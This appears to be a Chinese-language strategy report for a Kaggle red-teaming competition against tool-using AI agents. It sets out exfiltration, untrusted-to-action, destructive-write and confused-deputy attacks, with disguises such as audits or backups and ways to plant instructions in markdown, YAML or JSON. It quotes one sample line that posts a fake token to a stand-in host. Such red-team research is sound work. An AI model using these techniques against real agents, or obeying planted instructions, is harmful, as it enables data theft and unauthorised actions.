# Kaggle: AI Agent Security - Multi-Step Tool Attacks 研究报告

生成日期：2026-06-26（Australia/Melbourne）

> 说明：Kaggle 比赛页面多数为 JavaScript 动态渲染，本报告基于 Kaggle 官方页面的可索引内容、公开 Code/Notebook/Discussion 线索、以及 OWASP / CrowdStrike / Snyk 等公开 AI Agent 安全资料进行交叉整理。若 Kaggle 后续更新 Evaluation / Rules / Data 页面，应以官方页面最新内容为准。

---

## 1. Executive Summary

**AI Agent Security - Multi-Step Tool Attacks** 是一个非常适合 KCA/Claude Code/Codex CLI 这类 agent 工程体系的 Kaggle 安全评测比赛。它不是传统 NLP 分类或普通 prompt jailbreak，而是要求参赛者提交一个 `attack.py`，由官方评测器加载后，在受控的 JED red-team 环境中生成一组可重放的 multi-step attack candidates。官方评测器会在 fresh environment 中 replay 这些 prompt/tool trajectories，并根据隐藏安全谓词判断是否发生了可复现的安全失败。

核心目标可以概括为：

1. **让 tool-using AI agent 发生安全谓词违规**，例如 exfiltration、untrusted-to-action、destructive write、confused deputy。
2. **攻击必须可重放**，不是一次性的随机 jailbreak。
3. **分数奖励严重性和多样性**，不是只找到一个重复 payload。
4. **提交物是算法**，不是单个答案；优秀方案应自动搜索、验证、去重、保留最有价值的 attack chains。

我认为该比赛的有效路线不是“手写几十条提示词”，而是构建一个 **predicate-aware attack search engine**：以安全谓词为目标，围绕工具调用图、信任边界、数据流、外部通道、写入目标、payload 形态进行系统搜索；每个候选 attack chain 必须经过 deterministic replay 验证；最后按 severity、novelty、cross-model robustness 选择提交。

---

## 2. 比赛概况

### 2.1 比赛目标

官方概述将任务描述为：开发 attack algorithms，用来识别 tool-using AI agents 的可复现 multi-step failures。Data 页面将其称为 JED Red-Team Attack security evaluation benchmark，参赛者需要 craft prompt sequences，诱导工具型 agent 执行 harmful actions。

关键点：

- 参赛者不是提交预测 CSV 的传统 ML 模型，而是提交一个 `attack.py`。
- `attack.py` 中的 attack algorithm 会在官方 gateway / inference server 中运行。
- 评测器会加载该算法，要求它返回 replayable prompt chains / attack candidates。
- 官方 replay attack moves，并根据 security predicates 自动打分。

### 2.2 奖项与时间线

公开页面显示总奖金池为 USD 50,000，其中第一名 USD 15,000、第二名 USD 10,000。公开页面还显示 Entry Deadline 为 2026-08-25、Final Submission Deadline 为 2026-09-01、Working Note Deadline 为 2026-09-08。该比赛与 IEEE WCCI / IEEE Computational Intelligence Society 也有公开关联说明，获奖方案需要开源并形成 working note / research outcome。

### 2.3 目标模型

公开 Evaluation / Model 页面线索显示目标模型包括：

- GPT-OSS 系列，尤其是 gpt-oss-20b。
- Gemma 4 系列。

公开页面/讨论中出现过 time budget 的表述差异：有页面片段显示 18,000 秒，也有 Evaluation / Discussion 线索显示目标模型 sequentially evaluated，并且每个模型/阶段有 9,000 秒预算。实践上建议按更保守的 **9,000 seconds per model/phase** 设计提交，避免在私榜环境超时。

---

## 3. Overview / Data / Evaluation 页面理解

### 3.1 Data：不是普通表格数据集，而是安全评测环境

该比赛的数据并不是典型的 train.csv/test.csv。官方 Data 页面描述的是 JED Red-Team Attack 环境：参赛者构造 prompt sequences，攻击一个带工具的 AI agent。公开代码和讨论中出现了如下结构：

- `/kaggle/input/competitions/ai-agent-security-multi-step-tool-attacks`
- `kaggle_evaluation/jed_attack_134815/`
- `jed_attack_inference_server`
- `/kaggle/working/attack.py`

这意味着本比赛更像一个 **black-box / gray-box benchmark SDK**：数据集是一个环境与评测器，而不是静态样本表。

### 3.2 Submission：核心是 `attack.py`

公开 notebook/discussion 线索显示，提交 notebook 通常会在 `/kaggle/working/attack.py` 写入实现，官方评测器加载该文件并调用参赛者定义的 attack algorithm。公开讨论中常见困惑是：为什么 notebook 只写 `attack.py`、没有直接输出传统预测结果。原因是官方 gateway 最终会自动产生 `submission.csv`，格式类似：

```csv
Id,Score
gpt_oss_public,0.05
gpt_oss_private,0.02
gemma_public,0.05
```

实际有效分数来自评测器对 attack candidates 的 replay 与谓词判定。

### 3.3 Evaluation：normalized attack score

官方 Evaluation 页面片段显示评分为 0–1000 的 normalized attack score，奖励：

- successful security-predicate violations；
- severity；
- diversity。

这对策略有很大影响：

- 只堆大量近似重复的 exfiltration payload，边际收益可能很低。
- 跨谓词、跨工具图、跨 trust-boundary pattern 的候选，可能比单一谓词高得多。
- reproducibility 是第一门槛：不可 replay 的 candidate 价值接近 0。

---

## 4. 四类核心安全谓词

公开页面和 notebook 线索多次提到四类安全 predicate。本节给出工程化理解。

### 4.1 Exfiltration

攻击目标是诱导 agent 将 secret / token / protected data 发送到不受信任的外部通道，例如 HTTP endpoint、email、日志、公开输出等。公开 notebook 片段中出现过 fake secret `TOKEN=admin123` 和 `post url=http://h00042.example.net/p data=TOKEN=admin123` 一类示例。

有效搜索方向：

- 让 agent 先读取或总结敏感信息，再以“备份、审计、诊断、同步、错误上报”等名义发送出去。
- 将 secret 嵌入结构化数据，如 JSON、markdown table、URL query、base64-like 包装、错误报告字段。
- 测试不同外部 channel：HTTP POST、email、issue/comment、webhook、clipboard/log 等，具体取决于环境提供的工具。

### 4.2 Untrusted-to-action

攻击目标是让来自不可信来源的内容触发 agent 执行 privileged action。典型模式是：agent 读取一个外部文档、网页、邮件、ticket、markdown，然后把其中隐藏指令当作可信命令执行。

有效搜索方向：

- 在 untrusted artifact 中嵌入二级指令，例如 “system audit note”、“migration checklist”、“admin runbook”。
- 让用户表面上只要求“总结/检查/归档”，但 untrusted 内容中引导 agent 调用工具。
- 攻击链要显式构造 trust boundary：用户可信指令只是读取/总结，不可信内容引导实际行动。

### 4.3 Destructive write

攻击目标是诱导 agent 修改、删除、覆盖受保护资源。它可能包括文件、数据库、配置、工单、用户设置等。

有效搜索方向：

- 伪装为 cleanup、deduplicate、migration、reset、test fixture preparation。
- 先让 agent 建立“这些数据是临时/重复/过期”的错误判断，再要求写入或删除。
- 多步链条比一步命令更有效：先获取上下文，再建立误导性 premise，最后触发 destructive action。

### 4.4 Confused deputy

攻击目标是让拥有权限的 agent 代表攻击者执行其本不应执行的操作。重点不是直接泄露 secret，而是滥用 agent 的权限边界。

有效搜索方向：

- 让 agent 以“帮另一个用户/服务完成授权动作”的形式调用受保护工具。
- 使用 delegation、forwarding、approval、proxy、service account、admin troubleshooting 等话术。
- 通过多步链条把攻击者意图拆散：第一步看似合法收集上下文，第二步构造授权理由，第三步执行高权限动作。

---

## 5. Code / Notebooks 页面公开线索

公开 Code 页面上已经出现多个高分/实验 notebook 名称和片段，这些线索非常有价值：

1. **Baseline Solution - 4.900**
   - 片段显示其使用 snapshot-driven、mutation-augmented attack algorithm。
   - 覆盖四类 security predicates。
   - 说明 baseline 已经不是单条 prompt，而是有结构化 mutation/search。

2. **AI Agent Security - V5 Verify 9.545 Exact**
   - 片段显示其写入 deterministic `attack.py`，运行官方 JED attack。
   - “Verify” 暗示：验证并保留可复现 candidate 是高分关键。

3. **Verify-and-Keep: Deterministic Red-Team Attack**
   - 片段显示其加载 `attack.py` 并针对 target model 运行 search。
   - 这种模式应作为强 baseline：生成候选 → replay 验证 → keep successful → 去重。

4. **EDA: Agent Security Trajectory Search**
   - 片段显示 `attack.py => AttackAlgorithm`。
   - 说明轨迹级搜索是主流思路。

5. **Diversity Optimized Multi-Step Agent Red Teaming**
   - 片段提到 Predicate Mass：successful breaches 的 severity-weighted accumulation。
   - 说明多样性/谓词质量比单纯数量更重要。

6. **Replay-Dense Exfiltration Boundary Search**
   - 片段强调 replayed tool trace 才是有效得分单元。
   - 说明“看起来像攻击”的 prompt 没用，必须实际形成 replayable tool trace。

这些公开线索共同指向同一个结论：**得分的核心不是 prompt 文案，而是 attack search + replay verification + diversity selection 的工程系统。**

---

## 6. Discussion 页面公开线索

公开 Discussion 片段显示了几个实战注意点：

1. **`attack.py` 路径与提交机制容易出错**
   - 参赛 notebook 通常需要把文件写到 `/kaggle/working/attack.py`。
   - 官方 gateway 会自动加载并服务化。

2. **Runtime budget 是核心约束**
   - 讨论中有人提到 9,000s/phase clarification，也有人发现 runtime 远超预期。
   - 需要把算法设计为 anytime：即使被中断，也已经有一组已验证 candidates。

3. **Public LB 可能不能完全代表 Private LB**
   - 有讨论提到 public leaderboard 可能无法验证全部 attack types。
   - 因此不能只追 public score；应该平衡四类 predicate 和两个目标模型。

4. **无 streaming/checkpoint/partial-score 机制**
   - 讨论片段显示 leaderboard design 没有增加 streaming/checkpoint/partial-score。
   - 这要求 `attack.py` 内部尽早产生高质量 candidates，而不是把所有搜索放到最后。

---

## 7. 与 AI Agent Security 真实世界风险的关系

OWASP AI Agent Security Cheat Sheet 将 AI agents 描述为可以 reasoning、planning、使用 tools、维护 memory、采取 actions 的系统；主要风险包括 prompt injection、tool abuse / privilege escalation、data exfiltration、memory poisoning、goal hijacking、excessive autonomy、high-impact action abuse 等。

CrowdStrike 对 agentic tool chain attacks 的分析也强调：攻击者可以通过语言、metadata、context 操纵工具链，形成 tool poisoning、tool shadowing、rugpull 等攻击，最终导致 exfiltration、unauthorized actions、supply chain compromise。

Snyk 的 guardrails 资料则强调：真实 agent 往往拥有 email、file、shell、messaging、database 等工具；prompt injection 可以 cascade；confused deputy 是关键风险；防御上应在 tool call 前、tool output 后、access control 等 hook 层做拦截。

这与比赛目标高度一致：比赛虽然在 sandbox 中运行，但考察的是现实 agent 系统最核心的安全失败模式。

---

## 8. 我建议的总体技术路线

### 8.1 总体架构：Predicate-Aware Attack Search Engine

建议把 `attack.py` 设计为以下模块：

```text
attack.py
├── AttackAlgorithm
├── ScenarioLibrary
│   ├── exfiltration scenarios
│   ├── untrusted_to_action scenarios
│   ├── destructive_write scenarios
│   └── confused_deputy scenarios
├── PromptMutationEngine
├── TrajectoryRunner / Adapter
├── ReplayVerifier
├── PredicateSignalExtractor
├── DiversityArchive
└── CandidateSelector
```

核心流程：

```text
seed scenarios
  → generate candidate chains
  → run against target model/environment
  → collect tool trace + observation
  → infer predicate signal
  → deterministic replay
  → minimize chain
  → compute diversity signature
  → keep top-K candidates per predicate/model/signature
```

### 8.2 Anytime 搜索

由于时间预算可能紧张，建议采用三阶段 anytime 策略：

1. **Phase A：立即提交一批强静态 verified seeds**
   - 运行开始前几分钟内就应准备好基础 candidates。
   - 防止长搜索失败导致 0 分。

2. **Phase B：predicate-balanced mutation search**
   - 按四类 predicate 分配预算。
   - 对当前成功率低但潜在高 severity 的 predicate 加大探索。

3. **Phase C：diversity optimization and replay compaction**
   - 临近结束时不再盲目搜索，而是做 replay、dedup、minimize、selection。

### 8.3 多样性签名

建议对每条 candidate 计算 diversity signature：

```python
signature = (
    predicate_type,
    tool_call_graph_shape,
    trusted_source_type,
    untrusted_source_type,
    sink_channel,
    secret_pattern,
    write_target_type,
    endpoint_bucket,
    prompt_style_family,
    chain_length_bucket,
)
```

这样可以避免保留大量本质相同的攻击。选择时使用：

```text
score = severity_estimate
      + novelty_bonus(signature)
      + replay_confidence_bonus
      + cross_model_bonus
      - length_penalty
      - runtime_penalty
```

### 8.4 Go-Explore 风格轨迹档案

本比赛非常适合 Go-Explore 思路：

- cell = 当前环境状态 + 工具调用历史 + 数据流状态；
- archive = 每个 cell 中最高价值、最稳定的 trajectory；
- explore = 从 archive 中采样成功或近成功轨迹继续 mutation；
- exploit = 对已成功轨迹做最小化和多样化变体。

相比随机 prompt fuzzing，Go-Explore 能更好处理 multi-step sparse reward。

### 8.5 Cross-model robustness

目标包含 GPT-OSS 和 Gemma 4。两者可能在 tool-call discipline、instruction hierarchy、reasoning verbosity、refusal style、JSON/function-call 格式上不同。建议：

- 为每个模型维护独立 archive；
- 维护一个 shared robust set；
- 对同一 scenario 生成 GPT-OSS-oriented 与 Gemma-oriented 变体；
- 选择最终候选时保留：
  - model-specific high severity candidates；
  - cross-model stable candidates；
  - predicate-diverse candidates。

---

## 9. 提分技巧

### 9.1 不要只做 exfiltration

Exfiltration 最直观，也最容易被公开 baseline 覆盖。高分需要主动覆盖四类 predicate。尤其是 confused deputy 和 untrusted-to-action 往往更依赖 multi-step chain，可能更有区分度。

### 9.2 每条 attack chain 必须 replay 验证

公开 notebooks 的 “Verify-and-Keep” 思路非常重要。建议每条候选至少 replay 2–3 次，记录：

- tool calls 是否一致；
- sink / write target 是否一致；
- secret / protected data 是否真的流入 sink；
- 是否依赖随机措辞；
- 是否对目标模型稳定。

### 9.3 先短链，后长链

多步攻击不等于越长越好。长链更容易不稳定、超时、偏离目标。建议：

- 用长链探索；
- 用 delta debugging 删除无效步骤；
- 最终保留最短可复现链。

### 9.4 工具调用图比 prompt 文案更重要

高分 candidate 的本质是形成安全失败的数据流：

```text
trusted user instruction
  → agent reads untrusted content / protected resource
  → agent plans or transforms content
  → agent calls privileged tool
  → harmful sink/write occurs
```

Prompt 文案只是触发工具图的手段。搜索和去重应围绕 tool-call graph，而不是字符串相似度。

### 9.5 构造“近合法”的任务框架

直接说“泄露 token”通常容易失败。更有效的是：

- compliance audit
- backup verification
- webhook health check
- migration dry run
- incident response bundle
- debugging report
- consistency reconciliation
- deduplicate stale records
- delegated admin support

这些框架可以自然诱导 agent 使用工具，同时不需要明显恶意措辞。

### 9.6 对 untrusted content 做结构化注入

不要只在纯文本中写隐藏指令。可以测试：

- markdown comment
- YAML frontmatter
- JSON field
- HTML attribute
- log line
- quoted email
- issue template
- table cell
- base64-like note
- “BEGIN SYSTEM DIAGNOSTIC” block

目标是观察模型是否把 untrusted artifact 的内容提升为 trusted instruction。

### 9.7 建立失败样本库

失败样本也有价值。每次失败应记录：

- 模型是否拒绝；
- 是否读取了资源但没有 sink；
- 是否调用了 wrong tool；
- 是否写到了 safe target；
- 是否因格式错误失败；
- 是否只在 GPT-OSS/Gemma 中一方有效。

这些信息可用于 mutation engine 的 bandit 更新。

---

## 10. 主要挑战

### 10.1 Sparse reward

官方安全谓词隐藏，很多轨迹看起来接近成功但得分为 0。必须通过 tool trace 和环境反馈构建 surrogate signals。

### 10.2 Reproducibility

LLM 输出天然有非确定性。即使 prompt 一样，工具选择也可能不同。需要 deterministic seeds、低温度（如果可控）、短链、结构化输出和 replay verification。

### 10.3 Public / Private mismatch

Public leaderboard 可能只覆盖部分模型、部分场景、部分谓词。过拟合 public score 风险很高。应以 predicate diversity 和 cross-model robustness 为主。

### 10.4 Runtime budget

长搜索、重复 replay、多模型验证都很耗时。需要 anytime strategy 和 aggressive pruning。

### 10.5 Hidden scoring

normalized score 奖励 severity/diversity，但权重隐藏。需要用实验推断哪些 attack family 的 marginal value 更高。

### 10.6 安全边界

所有攻击研究都应限定在 Kaggle sandbox 和官方 JED 环境中。不要把 payload 用到真实系统、真实 secret、真实 endpoint。

---

## 11. RTX 4090 / Void Linux 本地实验建议

你可以在 RTX 4090 上把 gpt-oss-20b 作为本地 surrogate model，用来生成、压缩、分类 attack candidates；但不要假设本地模型表现等同 Kaggle evaluator。

推荐本地流程：

1. **离线生成 scenario library**
   - 用本地 gpt-oss-20b / Claude / Codex 生成多类 prompt templates。
   - 输出为 JSON/YAML，不直接塞进 `attack.py` 的巨大字符串。

2. **本地静态分析与 mutation**
   - mutation 不需要调用官方模型，可本地完成。
   - 生成 prompt variants、chain variants、tool-intent variants。

3. **Kaggle Notebook 内做官方 replay**
   - 官方环境才是 source of truth。
   - 把本地生成的候选压缩成 seed library，提交到 notebook 中验证。

4. **保存实验日志**
   - 记录每次 public score、candidate counts、predicate coverage、runtime。
   - 维护 `tracking.md`，类似你在 Nemo/Orbit 中的版本追踪。

5. **分离 generator 和 submission**
   - generator 可以很复杂，运行在本地。
   - `attack.py` 应尽量稳定、短小、鲁棒，包含已验证 seeds + 轻量 mutation/search。

---

## 12. 具体可实施版本计划

### V0：复现公开 baseline

目标：确保 submission pipeline 正确。

任务：

- 复现公开 baseline notebook。
- 确认 `/kaggle/working/attack.py` 被正确生成。
- 记录 public score、runtime、错误日志。
- 建立最小 `AttackAlgorithm` skeleton。

### V1：Verify-and-Keep

目标：建立可复现候选库。

任务：

- 实现 candidate replay verifier。
- 每条 candidate 保存 replay success count。
- 保留每个 predicate top-K。
- 实现简单 signature dedup。

### V2：Predicate-balanced mutation

目标：提高四类谓词覆盖。

任务：

- 为四类 predicate 各写 20–50 个 seed scenario。
- 实现 mutation families。
- 使用 bandit 根据 replay success 调整预算。

### V3：Diversity archive

目标：提升 normalized score 的 diversity 部分。

任务：

- 设计 tool graph signature。
- novelty bonus。
- endpoint / secret / source / sink 多样化。
- 对成功样本做 clustering 和 selection。

### V4：Cross-model specialization

目标：兼顾 GPT-OSS 和 Gemma 4。

任务：

- 分模型日志。
- 找到只对 GPT-OSS 有效、只对 Gemma 有效、两者都有效的 families。
- 最终 selection 保留三类 candidates。

### V5：Working note / final polish

目标：争取成绩 + working note 质量。

任务：

- 形成实验表格、ablation、failure taxonomy。
- 记录 private-safe 的方法论，不泄露具体 harmful real-world payload。
- 强化 reproducibility 和 ethics。

---

## 13. 建议的 Claude Code `/goal` 提示词

```md
/goal Investigate the Kaggle competition `AI Agent Security - Multi-Step Tool Attacks` in this repository context and build a reproducible research scaffold.

Scope:
- Do not call external APIs except Kaggle official competition resources if credentials are already configured.
- Do not run attacks against any real external service.
- Treat all attack content as Kaggle sandbox-only research.

Tasks:
1. Create docs/competitions/ai_agent_security/overview.md summarizing the competition, submission contract, evaluation, target models, and timeline.
2. Create docs/competitions/ai_agent_security/strategy.md with a predicate-aware attack search plan covering exfiltration, untrusted-to-action, destructive-write, and confused-deputy.
3. Create docs/competitions/ai_agent_security/tracking.md with experiment tables for version, public score, runtime, predicate coverage, model coverage, and notes.
4. Create a minimal src/ai_agent_security/attack_skeleton.py or competition-specific notebook helper that can generate `/kaggle/working/attack.py` without hardcoding secrets or external endpoints.
5. Add a seed-library format proposal in YAML/JSON, but do not include real-world harmful endpoints.
6. Add a README section explaining local vs Kaggle execution and safety boundaries.
7. Run lint/type checks if applicable and report exact commands/results.

Deliverables:
- docs/competitions/ai_agent_security/overview.md
- docs/competitions/ai_agent_security/strategy.md
- docs/competitions/ai_agent_security/tracking.md
- attack.py skeleton generator proposal
- concise audit summary of what remains unknown until official Kaggle replay is run
```

---

## 14. 我的最终判断

这个比赛的 winning direction 很可能具备以下特征：

1. **算法化 red-team，而不是 prompt collection**。
2. **强 replay verification**。
3. **四类 predicate 均衡覆盖**。
4. **工具调用图级别的 diversity selection**。
5. **针对 GPT-OSS / Gemma 的模型差异做专门优化**。
6. **anytime runtime strategy**，避免超时和 0 分。
7. **完整实验追踪和 working note**，因为比赛与 IEEE/WCCI research outcome 相关。

如果只做手工 prompt，很可能能接近公开 baseline，但难以稳定进入高分区。真正的提高空间在于：把这个问题当成 **agent trajectory search + security predicate optimization + reproducibility engineering**，这正好适合你目前的 KCA/Claude Code/Codex CLI 工作流。

---

## 15. 参考资料

- Kaggle Competition Overview: AI Agent Security - Multi-Step Tool Attacks
- Kaggle Data page: JED Red-Team Attack benchmark description
- Kaggle Evaluation page: normalized attack score, severity/diversity
- Kaggle Code page: public notebooks including Baseline Solution, Verify-and-Keep, Diversity Optimized Multi-Step Agent Red Teaming, Replay-Dense Exfiltration Boundary Search
- Kaggle Discussion page: attack.py submission mechanism, runtime clarification, public/private validation concerns
- OWASP AI Agent Security Cheat Sheet
- CrowdStrike: Agentic Tool Chain Attacks
- Snyk: Guardrails for agentic workflows
- OpenAI: gpt-oss official announcement and model card
- Google DeepMind: Gemma 4 official announcement
